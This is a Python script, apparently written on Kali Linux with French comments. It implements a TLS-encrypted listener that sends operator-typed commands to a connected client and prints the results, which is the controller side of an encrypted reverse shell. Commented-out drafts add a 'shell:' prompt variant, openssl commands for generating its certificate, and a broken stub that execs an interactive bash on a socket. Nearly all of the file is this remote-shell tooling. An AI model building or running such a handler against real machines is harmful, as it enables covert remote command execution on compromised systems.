import socket
import ssl

# Créer une socket TCP/IP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('localhost', 1234))
sock.listen(1)

# Envelopper la socket dans un contexte SSL
context =  ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="/home/kali/Documents/python/python_ssl.pem",
                        keyfile="/home/kali/Documents/python/python_ssl_priv.key")

while True:
    print("En attente de connexion...")
    conn, addr = sock.accept()

    # Envelopper la connexion entrante dans un contexte SSL
    connssl = context.wrap_socket(conn, server_side=True)
    print(connssl.version())

    try:
        print("Connecté par", addr)
        while True:
            command = input("->")
            connssl.sendall(command.encode())
            data = connssl.recv(1024)
            if not data:
                break
            print(data.decode())
    finally:
        connssl.shutdown(socket.SHUT_RDWR)
        connssl.close()


"""import ssl
import socket

HOST = 'localhost'
PORT = 1234

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
# Set the verify mode to OPTIONAL
#context.verify_mode = ssl.CERT_NONE

#openssl genrsa -out python_ssl_priv.key 2048
#openssl rsa -in python_ssl_priv.key -pubout -out python_ssl.pub
#openssl req -new -key python_ssl_priv.key -out python_ssl.pem -x509
context.load_cert_chain('/home/kali/Documents/python/python_ssl.pem',
                        '/home/kali/Documents/python/python_ssl_priv.key')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
    sock.bind((HOST, PORT))
    sock.listen(5)
    print("[+] Listening on port {}".format(PORT))
    with context.wrap_socket(sock, server_side=True) as ssock:
        conn, addr = ssock.accept()

while True:
    command = input("shell: ")
    if command:
        ssock.sendall(command.encode())
        data = ssock.recv(1024)
        if not data:
            break
        print(data.decode())"""


"""def shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST,PORT))
    s.listen()
    client_socket, client_address = s.accept()
    os = os.execv("/bin/bash", "-i")

if __name__ == "main":
    shell()
"""